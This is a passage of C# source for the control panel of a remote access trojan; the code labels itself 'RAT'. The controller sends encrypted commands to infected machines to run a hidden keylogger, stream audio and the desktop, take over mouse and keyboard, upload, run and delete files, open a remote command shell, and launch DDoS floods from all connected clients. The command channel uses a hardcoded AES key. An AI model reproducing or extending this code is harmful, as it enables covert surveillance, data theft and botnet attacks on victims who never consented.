                astream.Init(); //Init the playback
                SendToTarget("astream§" + deviceNumber.ToString()); //Send command to start streaming
                button25.Text = "Stop Stream"; //Update the button text
            }
        }

        /// <summary>
        /// Stop remote audio streaming
        /// </summary>
        public void XStopAudio()
        {
            if (InvokeRequired) //Check fi we need to invoke
            {
                Invoke(lbf.StopAudio); //Invoke
                return; //Return
            }

            if (AuStream) //Check if audio stream is running
            {
                SendToTarget("astop"); //Stop the client stream
                if (!RDesktop && !WStream) //If not remote desktop and no video stream is running
                {
                    Application.DoEvents(); //Do the events
                    System.Threading.Thread.Sleep(1500); //Wait for the client to stop the stream
                    MultiRecv = false; //Set multiRecv to false, since no surveillance module is running
                }
                AuStream = false; //Disable audio streaming
                astream.Destroy(); //Release the playback object
                astream = null; //Set the playback reference to null
                button25.Text = "Start Stream"; //Update the button text
            }
        }

        /// <summary>
        /// List audio streaming devices
        /// </summary>
        public void XListAudio()
        {
            SendToTarget("alist"); //Send listing command
        }

        /// <summary>
        /// Start remote desktop session
        /// </summary>
        public void XStartRemoteDesktop()
        {
            if (!RDesktop) //If remote desktop not started
            {
                btnStartRemoteScreen_Click(null, null); //Click button for remote desktop start
            }
        }

        /// <summary>
        /// Stop remote desktop session
        /// </summary>
        public void XStopRemoteDesktop()
        {
            if (InvokeRequired) //If we need to invoke
            {
                Invoke(lbf.StopRemoteDesktop); //Invoke
                return; //Return
            }

            btnStopRemoteScreen_Click(null, null); //Click button, for remote desktop to stop
        }

        /// <summary>
        /// Control the state of remote mouse
        /// </summary>
        /// <param name="state">The state of the remote mouse</param>
        public void XControlRemoteMouse(bool state)
        {
            if (InvokeRequired) //If we need to invoke
            {
                Invoke(lbf.ControlRemoteMouse); //Invoke
                return; //Return
            }

            checkBoxrMouse.Checked = state; //Change the state
            checkBoxrMouse_CheckedChanged(null, null); //Call checkbox event
        }

        /// <summary>
        /// Control the state of remote keyboard
        /// </summary>
        /// <param name="state">State of remote keyboard</param>
        public void XControlRemoteKeyboard(bool state)
        {
            if (InvokeRequired) //If we need to invoke
            {
                Invoke(lbf.ControlRemoteKeyboard); //Invoke
                return; //Return
            }

            checkBoxrKeyboard.Checked = state; //Change the state
            checkBoxrKeyboard_CheckedChanged(null, null); //Call checkbox event
        }

        /// <summary>
        /// Change remote desktop to full screen mode
        /// </summary>
        public void XLaunchFullScreen()
        {
            if (InvokeRequired) //If we need to invoke
            {
                Invoke(lbf.StartFullScreen); //Invoke
                return; //Return
            }

            btnFullRemoteScreen_Click(null, null); //Click button, for remote desktop to switch to full screen
        }

        /// <summary>
        /// Start remote keylogger
        /// </summary>
        public void XStartKeylogger()
        {
            SendToTarget("sklog"); //Send command to start keylogger
        }

        /// <summary>
        /// Stop the remote keylogger
        /// </summary>
        public void XStopKeylogger()
        {
            SendToTarget("stklog"); //Send command to stop remote keylogger
        }

        /// <summary>
        /// Read the remote keylog
        /// </summary>
        public void XReadKeylog()
        {
            SendToTarget("rklog"); //Send command to read remote keylog
        }

        /// <summary>
        /// Clear remote keylog buffer
        /// </summary>
        public void XClearKeylog()
        {
            SendToTarget("cklog"); //Send command to clear remtote keylog buffer
        }

        /// <summary>
        /// List remote drives
        /// </summary>
        public void XListDrives()
        {
            SendToTarget("fdrive"); //Send command to list remote drives
        }

        /// <summary>
        /// Change the current folder for remote filesystem browser
        /// </summary>
        /// <param name="folderName">The folder to browse to</param>
        public void XChangeFolder(string folderName)
        {
            if (InvokeRequired) //If we need to invoke
            {
                Invoke(lbf.ChangeDircectory, new object[] { folderName }); //Invoke
                return; //Return
            }

            SendToTarget("fdir§" + folderName); //Send command to list remote files
            CurrentPath = folderName; //Set the current path
            listView3.Items.Clear(); //Clear the files listView
        }

        /// <summary>
        /// Travel one directory up in the tree
        /// </summary>
        public void XUp1()
        {
            SendToTarget("fdir§" + CurrentPath); //Send command to up1 directory          
        }

        /// <summary>
        /// Remote Copy File
        /// </summary>
        /// <param name="fileName">The path of the file to copy</param>
        public void XCopyFile(string fileName)
        {
            xfer_path = fileName; //Set file path
            xfer_mode = xfer_copy; //Set transfer mode
        }

        /// <summary>
        /// Move remote file
        /// </summary>
        /// <param name="fileName">Path of the file to move</param>
        public void XMoveFile(string fileName)
        {
            xfer_path = fileName; //Set the file path
            xfer_mode = xfer_move; //Set the transfer mode
        }

        /// <summary>
        /// Paste remote file
        /// </summary>
        /// <param name="targetDirectory">The directory to paste the file to</param>
        public void XPasteFile(string targetDirectory)
        {
            SendToTarget("fpaste§" + targetDirectory + "§" + xfer_path + "§" + xfer_mode); //Send command to paste file
        }

        /// <summary>
        /// Execute remote file
        /// </summary>
        /// <param name="targetFile">Path of the file to execute</param>
        public void XExecuteFile(string targetFile)
        {
            SendToTarget("fexec§" + targetFile); //Send command to execute remote file
        }

        /// <summary>
        /// Upload file to remote system
        /// </summary>
        /// <param name="dir">The remote directoty to upload to</param>
        /// <param name="file">The local file to upload</param>
        public void XUploadFile(string dir, string file)
        {
            dir += "\\" + new FileInfo(file).Name; //Set the full file path
            String cmd = "fup§" + dir + "§" + new FileInfo(file).Length; //Construct the command to send
            fup_local_path = file; //Set the upload file path
            SendToTarget(cmd); //Send the command to the client
        }

        /// <summary>
        /// Download a file from the remote file system
        /// </summary>
        /// <param name="targetFile">The local path of the file</param>
        /// <param name="remoteFile">The remote file to download</param>
        public void XDownloadFile(string targetFile, string remoteFile)
        {
            fdl_location = targetFile; //Set the local file download location
            SendToTarget("fdl§" + remoteFile); //Send command to download file
        }

        /// <summary>
        /// Open the file editor
        /// </summary>
        /// <param name="remoteFile">Path of the remote file to edit</param>
        public void XOpenFileEditor(string remoteFile)
        {
            edit_content = remoteFile; //Set the remote file path
            SendToTarget("getfile§" + remoteFile); //Send command to client
        }

        /// <summary>
        /// Change remote file's attribute
        /// </summary>
        /// <param name="remoteFile">Path of the remote file to change the attrs of</param>
        /// <param name="visibility">The visibility of the remote file</param>
        public void XChangeAttribute(string remoteFile, Types.Visibility visibility)
        {
            string command = "f" + sCore.Utils.Convert.ToStr(visibility) + "§" + remoteFile; //Construct the command
            SendToTarget(command); //Send the command to the client
        }

        /// <summary>
        /// Delete a file/directory on the remote file system
        /// </summary>
        /// <param name="remoteFile">File or Directory path to delete</param>
        public void XDeleteFile(string remoteFile)
        {
            if (InvokeRequired) //If we need to invoke
            {
                Invoke(lbf.DeleteFile, new object[] { remoteFile }); //Invoke
                return; //Return
            }

            SendToTarget("fdel§" + remoteFile); //Send the command to the client
            RefreshFiles(); //Refresh the file list
        }

        /// <summary>
        /// Rename a remote file/directory
        /// </summary>
        /// <param name="remoteFile">The path of the remote file/directory</param>
        /// <param name="newName">The new name of the file/directory</param>
        public void XRenameFile(string remoteFile, string newName)
        {
            SendToTarget("frename§" + remoteFile + "§" + newName); //Send command to client
        }

        /// <summary>
        /// Create a new directory on the remote file system
        /// </summary>
        /// <param name="targetDirectory">The parent directory</param>
        /// <param name="name">The name of the new directory</param>
        public void XNewDirectory(string targetDirectory, string name)
        {
            if (InvokeRequired) // If we need to invoke
            {
                Invoke(lbf.CreateFolder, new object[] { targetDirectory, name }); //Invoke
                return; //Return
            }

            SendToTarget("fndir§" + targetDirectory + "§" + name); //Send command to the client
            RefreshFiles(); //Refresh the file list
        }

        /// <summary>
        /// Create a new file on the remote file system
        /// </summary>
        /// <param name="targetDirectory">The parent directory</param>
        /// <param name="name">The name of the new file</param>
        public void XNewFile(string targetDirectory, string name)
        {
            if (InvokeRequired) //If we need to invoke
            {
                Invoke(lbf.CreateFile, new object[] { targetDirectory, name }); //Invoke
                return; //Return
            }

            SendToTarget("ffile§" + targetDirectory + "§" + name); //Send command to the client
            RefreshFiles(); //Refresh the file list
        }

        /// <summary>
        /// Display a local message box
        /// </summary>
        /// <param name="text">The text of the message box</param>
        /// <param name="title">The title of the message box</param>
        /// <param name="buttons">The message box buttons</param>
        /// <param name="icon">The message box icon</param>
        /// <returns>The dialog result of the message box</returns>
        public DialogResult XMessageBox(string text, string title, MessageBoxButtons buttons, MessageBoxIcon icon)
        {
            if (InvokeRequired) //If we need to invoke
            {
                return (DialogResult) Invoke(lbf.ShowMessageBox, new object[] { text, title, buttons, icon }); //Invoke and return
            }

            return MessageBox.Show(this, text, title, buttons, icon); //Show the message box and return the result
        }

        /// <summary>
        /// Start the local server listener
        /// </summary>
        public void XStartServer()
        {
            if (InvokeRequired) //If we need to invoke
            {
                Invoke(lbf.StartServer); //Invoke
                return; //Return
            }
            if (!IsStartedServer) button1_Click(null, null); //If the server isn't started then start it
        }

        /// <summary>
        /// Stop the local server listener
        /// </summary>
        public void XStopServer()
        {
            if (InvokeRequired) //If we need to invoke
            {
                Invoke(lbf.StopServer); //Invoke
                return; //Return
            }
            if (IsStartedServer) button1_Click(null, null); //If the server is started, then stop it
        }

        /// <summary>
        /// Toggle the local server listener
        /// </summary>
        public void XToggleServer()
        {
            if (InvokeRequired) //if we need to invoke
            {
                Invoke(lbf.ToggleServer); //Invoke
                return; //Return
            }

            button1_Click(null, null); //Toggle the server state
        }

        /// <summary>
        /// Display a message box on the remote system
        /// </summary>
        /// <param name="text">The text of the message box</param>
        /// <param name="title">The title of the message box</param>
        /// <param name="buttons">The message box buttons</param>
        /// <param name="icon">The message box icon</param>
        public void XRemoteMessage(string text, string title, Types.RemoteMessageButtons buttons, Types.RemoteMessageIcons icon)
        {
            string command = "msg|" + title + "|" + text + "|" + ((int)icon).ToString() + "|" + ((int)buttons).ToString(); //Construct the command
            SendToTarget(command); //Send the command to the client
        }

        /// <summary>
        /// Play a frequecy on the remote systen
        /// </summary>
        /// <param name="frequency">The frequency to play</param>
        public void XFrequency(string frequency)
        {
            SendToTarget("freq-" + frequency); //Send command to client
        }

        /// <summary>
        /// Play a system sound on the remote system
        /// </summary>
        /// <param name="sound">The system sound to play</param>
        public void XSystemSound(Types.SystemSounds sound)
        {
            string command = "sound-" + ((int)sound).ToString(); //Construct the command
            SendToTarget(command); //Send to command to the client
        }

        /// <summary>
        /// Execute Text To Speech on a remote system
        /// </summary>
        /// <param name="text">The text to read</param>
        public void XT2s(string text)
        {
            string command = "t2s|" + text; //Construct the command
            SendToTarget(command); //Send command to the client
        }

        /// <summary>
        /// Control windows element visibility on the remote system
        /// </summary>
        /// <param name="element">The element to change the state of</param>
        /// <param name="visibility">The visibility of the element</param>
        public void XElements(Types.SystemElements element, Types.Visibility visibility)
        {
            string welement = sCore.Utils.Convert.ToStr(element); //Get the element string
            string wvisibility = sCore.Utils.Convert.ToStr(visibility); //Get the visibility state string
            string command = "emt|" + wvisibility + "|" + welement; //Construct the command
            SendToTarget(command); //Send the command to client
        }

        /// <summary>
        /// Control the CD Tray of the remote system
        /// </summary>
        /// <param name="cdState">The state of the CD Tray</param>
        public void XCdTray(Types.CdTray cdState)
        {
            string command = "cd|" + sCore.Utils.Convert.ToStr(cdState); //Connstruct the command
            SendToTarget(command); //Send command to client
        }

        /// <summary>
        /// List running processes on the remote system
        /// </summary>
        public void XListProcesses()
        {
            if (InvokeRequired) //If we need to invoke
            {
                Invoke(lbf.ListProcesses); //Invoke
                return; //Return
            }

            refreshToolStripMenuItem1_Click(null, null); //Refresh the process list
        }

        /// <summary>
        /// Kill a process on the remote system
        /// </summary>
        /// <param name="processId">The PID of the process to kill</param>
        public void XKillProcess(string processId)
        {
            String cmd = "prockill|" + processId; //Contruct the command

            SendToTarget(cmd); //Send command to the client

            System.Threading.Thread.Sleep(1000); //Wait for the process to die
            XListProcesses(); //Refresh the process list
        }

        /// <summary>
        /// Start a process on the remote system
        /// </summary>
        /// <param name="processName">The name of the process(file path)</param>
        /// <param name="visibility">The visibility of the process window</param>
        public void XStartProcess(string processName, Types.Visibility visibility)
        {
            if (InvokeRequired) //If we need to invoke
            {
                Invoke(lbf.StartProcess, new object[] { processName, visibility }); //Invoke
                return; //Return
            }

            String cmd = "procstart|" + processName + "|" + sCore.Utils.Convert.ToStrProcessVisibility(visibility); //Construct the command

            SendToTarget(cmd); //Send the command to client
            System.Threading.Thread.Sleep(1000); //Wait for the client to start the process
            XListProcesses(); //Refresh the process list
        }

        /// <summary>
        /// Start remote command line session
        /// </summary>
        public void XStartCmd()
        {
            if (!IsCmdStarted) //If remote cmd isn't started
            {
                if (InvokeRequired) //If we need to invoke
                {
                    Invoke(lbf.StartCmd); //Invoke
                    return; //Return
                }
                button15_Click(null, null); //Start the remtote cmd session
            }
        }

        /// <summary>
        /// Stop the remote command line session
        /// </summary>
        public void XStopCmd()
        {
            if (IsCmdStarted) //If the remote cmd is running
            {
                if (InvokeRequired) //If we need to invoke
                {
                    Invoke(lbf.StopCmd); //Invoke
                    return; //Return
                }

                button15_Click(null, null); //Stop the remote cmd session
            }
        }

        /// <summary>
        /// Toggle the remote command line session
        /// </summary>
        public void XToggleCmd()
        {
            if (InvokeRequired) //If we need to invoke
            {
                Invoke(lbf.ToggleCmd); //Invoke
                return; //Return
            }
            button15_Click(null, null); //Toggle the remote cmd state
        }

        /// <summary>
        /// Send command to the remote command line
        /// </summary>
        /// <param name="command">The command to execute</param>
        public void XSendCmdCommand(string command)
        {
            SendToTarget("cmd§" + command); //Send the command to the client
        }

        /// <summary>
        /// Read command line output
        /// </summary>
        /// <returns>The output of the command line</returns>
        public string XReadCmdOutput()
        {
            if (InvokeRequired) //If we need to invoke
            {
                return (string)Invoke(lbf.ReadCmdOutput); //Invoke and return
            }

            return richTextBox2.Text; //Return all output text
        }

#endregion

#region Form and Server Functions

        /// <summary>
        /// Constructor
        /// </summary>
        public Form1()
        {
            me = this; //Set a self reference
            InitializeComponent(); //Init the UI controls
        }

        /// <summary>
        /// Update the screen update value based on the trackBar
        /// </summary>
        public void ScreenFPS()
        {
            int value = me.trackBar1.Value; //Get the trackBar's value
            me.lblQualityShow.Text = value.ToString(); //Display the trackBar's value

            //Decide FPS based on it's position
            if (value < 25)
                FPS = 150;  //low
            else if (value >= 75 && value <= 85)
                FPS = 80; //best
            else if (value >= 85)
                FPS = 50; //high
            else if (value >= 25)
                FPS = 100; //mid
        }

        /// <summary>
        /// Remove a pipe from the list
        /// </summary>
        /// <param name="obj">The pipe to remove</param>
        /// <param name="remote">If the pipe is connected</param>
        public void RemovePipe(RemotePipe obj, bool remote = true)
        {
            int rmid = 0; //Declare index variable
            bool canRemove = false; //Declare removing flag

            foreach (RemotePipe rp in rPipeList) //Go through all pipes
            {
                if (obj == rp) //If the pipes match
                {
                    canRemove = true; //We can remove the pipe
                    break; //Break the loop
                }
                rmid++; //Increment the index
            }

            if (canRemove) //If we can remove the pipe
            {
                string sName = rPipeList[rmid].pname; //Get the name of the server
                sCore.RAT.ExternalApps.RemoveIPCConnection(hostToken, sName); //Remove the connection from the plugins
                if (remote) SendToTarget("stopipc§" + sName); //If the pipe is connected, then send a command to the remote client
                rPipeList.RemoveAt(rmid); //Remove the pipe from the list
            }
        }

        /// <summary>
        /// Start a DDoS Attack against a remote server
        /// </summary>
        /// <param name="ip">The IP address of the target server</param>
        /// <param name="port">The remote port to flood on</param>
        /// <param name="protocol">The protocol to use</param>
        /// <param name="packetSize">The size of each sent packet</param>
        /// <param name="threads">How many threads to use per client</param>
        /// <param name="delay">How many time to wait between packets</param>
        /// <param name="isAllClient">Attack with all connected clients</param>
        private void StartDDoS(string ip, string port, string protocol, string packetSize, string threads, string delay, bool isAllClient)
        {
            StringBuilder sb = new StringBuilder();
            sb.Append("ddosr|")
                .Append(ip).Append("|")
                .Append(port).Append("|")
                .Append(protocol).Append("|")
                .Append(packetSize).Append("|")
                .Append(threads).Append("|")
                .Append(delay);

            string command = sb.ToString();
            if (isAllClient) //If we want to attack with every client
            {
                int inc = 0; //Declare index variable
                foreach (Socket s in _clientSockets) //Go through the connected sockets
                {
                    SendCommand(command, inc); //Send the command to the client
                    inc++; //Incremnet the index
                }
                label18.Text = "Status: DDoS Started [Client_Count:" + inc.ToString() + " Target_IP:" + ip + " Target_Port:" + port + "]"; //Update the UI
            }
            else
            {
                SendToTarget(command); //Send the command to the client
                label18.Text = "Status: DDoS Started [Client_Count:1 Target_IP:" + ip + " Target_Port:" + port + "]"; //Update the UI
            }
        }

        /// <summary>
        /// Test if target received DDoS packets
        /// </summary>
        /// <param name="ip">The IP address to test</param>
        /// <param name="port">The protocol to use for testing</param>
        /// <returns>If the target can be reached via the protocol</returns>
        private bool TestDDoS(string ip, string port)
        {
            if (port == "ICMP ECHO (Ping)") //Ping protocol
            {
                System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping(); //Create a new ping object
                System.Net.NetworkInformation.PingReply reply = ping.Send(ip, 1000, Encoding.Unicode.GetBytes("Test")); //Send the ping and read the reply
                if (reply.Status == System.Net.NetworkInformation.IPStatus.Success) //Ping was successful
                {
                    //Notify the user
                    MessageBox.Show(this, "Ping succes with 1 second timeout and 4 bytes of data (test)", "Target responded to ping", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return true; //Return true
                }
                else //Ping failed
                {
                    //Notify the user
                    MessageBox.Show(this, "Ping failed with 1 second timeout and 4 bytes of data (test)", "Target didn't responded to ping!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return false; //Return false
                }
            }
            else if (port == "TCP") //Use TCP protocol
            {
                TcpClient client = new TcpClient(); //Create a new client
                try
                {
                    client.Connect(ip, int.Parse(numericUpDown1.Value.ToString())); //Connect to the remote server
                    if (client.Connected) //Client can connect
                    {
                        //Notify the user
                        MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " successed", "TCP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        return true; //Return true
                    }
                    else //Client could not connect to the remote server
                    {
                        //Notify the user
                        MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " failed", "TCP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        return false; //Return false
                    }
                }
                catch (Exception) //Client can't connect
                {
                    //Notify the user
                    MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " failed", "TCP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return false; //Return false
                }
            }
            else // UDP Connection
            {
                try
                {
                    UdpClient client = new UdpClient(); //Create a UDP client
                    client.Connect(ip, int.Parse(numericUpDown1.Value.ToString())); //Connect to the remote server
                    IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), int.Parse(numericUpDown1.Value.ToString())); //Create an EndPoint to the remote server
                    client.Send(new byte[] { 0x0, 0x1, 0x2, 0x3 }, 4, ep); //Send test data to the remote server
                    //Notify the user
                    MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " successed", "UDP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return true; //Return true
                }
                catch (Exception) //Client can't connect or send the data
                {
                    //Notify the user
                    MessageBox.Show(this, "Connection to " + ip + ":" + int.Parse(numericUpDown1.Value.ToString()) + " failed", "UDP DDoS test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return false; //Return false
                }
            }
        }

        /// <summary>
        /// Main form closing event
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_clientSockets.Count > 0) CloseAllSockets(); //If clients are connected, then close them
            if (sh != null) //If ScriptHost is enabled
            {
                foreach (IPluginMain ipm in sh.runningPlugins) //Go through the running plugins
                {
                    ipm.OnExit(); //Stop the plugin
                }
            }

            Environment.Exit(0); //Exit the application
        }

        /// <summary>
        /// Save edited file contents
        /// </summary>
        /// <param name="content">The content to save</param>
        public void SaveFile(String content)
        {
            string cmd = "putfile§" + edit_content + "§" + content; //Construct the command
            SendToTarget(cmd); //Send the command to the client
            RefreshFiles(); //Refresh the file list
        }

        /// <summary>
        /// Display an inputbox on the local system
        /// </summary>
        /// <param name="title">The title of the input box</param>
        /// <param name="promptText">The prompt text of the input box</param>
        /// <param name="value">The variable in which the answer is stored in</param>
        /// <returns>The dialog result of the input box</returns>
        public DialogResult InputBox(string title, string promptText, ref string value)
        {
            //This code is from http://www.csharp-examples.net/inputbox/
            Form form = new Form(); //Create a new from
            Label label = new Label(); //Create the promptText label
            TextBox textBox = new TextBox(); //Create the input textbox
            Button buttonOk = new Button(); //Create the OK button
            Button buttonCancel = new Button(); //Create the cancel button

            form.Text = title; //Set the title text
            label.Text = promptText; //Set the prompt text
            textBox.Text = value; //Set the default value for the input

            buttonOk.Text = "OK"; //Set the button text
            buttonCancel.Text = "Cancel"; //Set the button text
            buttonOk.DialogResult = DialogResult.OK; //Set dialog result OK
            buttonCancel.DialogResult = DialogResult.Cancel; //Set dialog result cancel

            label.SetBounds(9, 20, 372, 13); //Set the label size
            textBox.SetBounds(12, 36, 372, 20); //Set the inputbox size
            buttonOk.SetBounds(228, 72, 75, 23); //Set buttonOk size
            buttonCancel.SetBounds(309, 72, 75, 23); //Set button cancel size

            label.AutoSize = true; //Set the label to autosize
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right; //Set textBox anchor
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right; //Set ok button anchor
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right; //Set cancel button anchor

            form.ClientSize = new Size(396, 107); //Set the form's size
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel }); //Add the controls to the form
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height); //Set the form's client size
            form.FormBorderStyle = FormBorderStyle.FixedDialog; //Set the border style
            form.StartPosition = FormStartPosition.CenterScreen; //Set the start position
            form.MinimizeBox = false; //Hide the minimize box
            form.MaximizeBox = false; //Hide the maximize box
            form.AcceptButton = buttonOk; //Set the accept button
            form.CancelButton = buttonCancel; //Set the cancel button

            DialogResult dialogResult = form.ShowDialog(); //Get the result of the dialog nad show it
            value = textBox.Text; //Set the value to the result answer
            return dialogResult; //Return the dialog result
        }

        /// <summary>
        /// Refresh the file list on the current directory
        /// </summary>
        private void RefreshFiles()
        {
            Application.DoEvents(); //Do the events
            System.Threading.Thread.Sleep(1500); //Wait for 1.5 seconds
            listView3.Items.Clear(); //Clear the file list
            string cmd = "fdir§" + CurrentPath; //Construct the command
            SendToTarget(cmd); //Send the command to the client
        }

        /// <summary>
        /// Send command to a client
        /// </summary>
        /// <param name="command">The command to send</param>
        /// <param name="targetClient">The client to send the command to</param>
        private void SendCommand(string command, int targetClient)
        {
            try
            {
                Socket s = _clientSockets[targetClient]; //Get the socket

                if (lcm.IsLinuxClient(s)) //Check if client is linux client
                {
                    lcm.SendCommand(command, targetClient); //Send the command using the linux client manager
                    return; //Return
                }

                try
                {
                    command = Encrypt(command); //Encrypt the comand
                    byte[] data = Encoding.Unicode.GetBytes(command); //Get the unicode bytes of the comand
                    string header = command.Length.ToString() + "§"; //Create message length header
                    byte[] byteHeader = Encoding.Unicode.GetBytes(header); //Convert the header to bytes
                    byte[] fullBytes = new byte[byteHeader.Length + data.Length]; //Allocate space for the full message
                    Array.Copy(byteHeader, fullBytes, byteHeader.Length); //Copy the message hader to the full message
                    Array.ConstrainedCopy(data, 0, fullBytes, byteHeader.Length, data.Length); //Copy the message to the full message
                    s.Send(fullBytes); //Send the full message
                }
                catch (Exception) //Something went wrong
                {
                    int id = targetClient; //Store the id of the target client
                    reScanTarget = true; //Set rescan flag to true
                    reScanStart = id; //Set the rescan target
                    Console.WriteLine("Client forcefully disconnected"); //Debug Function
                    s.Close(); //Close the target socket
                    _clientSockets.Remove(s); //Remove the socket from the list
                    SwitchTab(tabControl1.TabPages[0]); //Switch to the client selection tab
                    RestartServer(id); //Restart the server
                    return; //Return
                }

            }
            catch
            {
                //Do nothing
            }
        }

        /// <summary>
        /// Send a command to every controlled client
        /// </summary>
        /// <param name="command">The command to send</param>
        public void SendToTarget(string command)
        {
            SendCommand(command, controlClient);
        }

        /// <summary>
        /// Send byte data to controlled clients
        /// </summary>
        /// <param name="data">The bytes to send</param>
        private void SendBytesToTarget(byte[] data)
        {
            SendCommand(data, controlClient);
        }

        /// <summary>
        /// Send raw byte data to client
        /// </summary>
        /// <param name="data">The bytes to send</param>
        /// <param name="targetClient">The target client</param>
        private void SendCommand(byte[] data, int targetClient)
        {
            Socket s = _clientSockets[targetClient]; //Get the socket of the target client
            s.Send(data); //Send the bytes to the client
        }

        /// <summary>
        /// Encrypt commands sent to the client
        /// </summary>
        /// <param name="clearText">The command to encrypt</param>
        /// <returns>The encrypted command</returns>
        public string Encrypt(string clearText)
        {
            string EncryptionKey = "MAKV2SPBNI99212"; //Declare the encryption key (it's not the best thing to do)
            byte[] clearBytes = Encoding.Unicode.GetBytes(clearText); //Get the bytes of the message
            using (Aes encryptor = Aes.Create()) //Create a new aes object
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 }); //Get encryption key
                encryptor.Key = pdb.GetBytes(32); //Set the encryption key
                encryptor.IV = pdb.GetBytes(16); //Set the encryption IV

                using (MemoryStream ms = new MemoryStream()) //Create a new memory stream
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write)) //Create a new crypto stream
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length); //Write the command to the crypto stream
                        cs.Close(); //Close the crypto stream
                    }
                    clearText = System.Convert.ToBase64String(ms.ToArray()); //Convert the encrypted bytes to a Base64 string
                }
            }
            return clearText; //Return the encrypted command
        }

        /// <summary>
        /// Decrypt responses sent by the client
        /// </summary>
        /// <param name="cipherText">The encrypted zext sent by the client</param>
        /// <returns>The decrypted text</returns>
        public string Decrypt(string cipherText)
        {
            try //Try
            {
                string EncryptionKey = "MAKV2SPBNI99212"; //Declare the decryption key (not the best thing to do, same key as above)
                byte[] cipherBytes = System.Convert.FromBase64String(cipherText); //Decrypt base 64 to bytes
                using (Aes encryptor = Aes.Create()) //Create a new aes object
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 }); //Get encryption key
                    encryptor.Key = pdb.GetBytes(32); //Set the key
                    encryptor.IV = pdb.GetBytes(16); //Set the IV
                    using (MemoryStream ms = new MemoryStream()) //Create new memory stream
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write)) //Create new crypto stream
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length); //Write the encrypted data to the crypto stream
                            cs.Close(); //Close the crypto stream
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray()); //Convert the memory stream to string
                    }
                }

                return cipherText; //Return the decrypted text
            }
            catch (Exception) //Can't decrypt
            {
                //plain text?
                //  MessageBox.Show("Decrypt error "); //dont show the decrytp error it is too large and causes more problems
                //return  cipherText;
                //Set the exception flag
                IsException = true; //spirals out of control here if you cannot decrypt jibberish over bad connection so added this - seems to work
                return null; //Return null
            }
        }

        // TODO: this could become a class to pass references only
        /// <summary>
        /// Struct for storing Client Information
        /// </summary>
        struct ClientObject
        {
            public byte[] buffer; //The received buffer of the client
            public Socket s; //The socket of the client
        }

        /// <summary>
        /// Get a socket by client ID
        /// </summary>
        /// <param name="id">The id of the client to get the socket of</param>
        /// <returns>The socket of the client</returns>
        public Socket GetSocketById(int id)
        {
            if (id >= _clientSockets.Count) return null; //Check if the ID is too big
            return _clientSockets[id]; //Return the socket of the client
        }

        /// <summary>
        /// When the form is shown to the user
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void Form1_Shown(object sender, EventArgs e)
        {
            ServicePointManager.UseNagleAlgorithm = false; //Disable Nagle Algorithm (Multiple TCP messages sent in a short period of time will be sent as one if enabled)
            richTextBox2.ReadOnly = true; //Set the terminal window to read only
            richTextBox2.BackColor = Color.Black; //Set the terminal window's backColor to black
            richTextBox2.ForeColor = Color.White; //Set the terminal window's foreColor (text color) to white
            comboBox1.SelectedIndex = 0; //Select the first item from the message box icons
            comboBox2.SelectedIndex = 0; //Select the first item from the message box buttons
            comboBox3.SelectedIndex = 0; //Select the first item from the system sounds
            comboBox4.SelectedIndex = 0; //Select the first item from the process visibility
            label24.Hide(); //Set the live updates label to hidden visibility
            label36.Hide(); //Auto Load Status Display
            progressBar1.Hide(); //Auto Load Status Display 2
            button20.Enabled = false; //Auto Load button
            
            //Add dynamic toolstrip item event handlers
            contextMenuStrip2.ItemAdded += new ToolStripItemEventHandler(TSItemAdded);
            contextMenuStrip2.ItemRemoved += new ToolStripItemEventHandler(TSItemRemoved);
            contextMenuStrip3.ItemAdded += new ToolStripItemEventHandler(TSItemAdded);
            contextMenuStrip3.ItemRemoved += new ToolStripItemEventHandler(TSItemRemoved);

            for (int a = 0; a < contextMenuStrip2.Items.Count; a++) //Loop through the process manager's toolstrip items
            {
                ToolStripItem i = contextMenuStrip2.Items[a]; //The current item
                tsitem.Add(i); //Add the item to the list
                tsrefname.Add(i.Name); //Add the item's name to the list
            }
            for (int a = 0; a < contextMenuStrip3.Items.Count; a++) //Loop through the file manager's toolstip items
            {
                ToolStripItem i = contextMenuStrip3.Items[a]; //The current item
                tsitem.Add(i); //Add the item to the list
                tsrefname.Add(i.Name); //Add the item's name to the list
            }
            foreach (TabPage p in tabControl1.TabPages) //Loop through the TabPages
            {
                pages.Add(p); //Add the current page to the list
            }

            // TODO: do we actually need routeWindow or does it just hurt the performance?
            Timer update = new Timer
            {
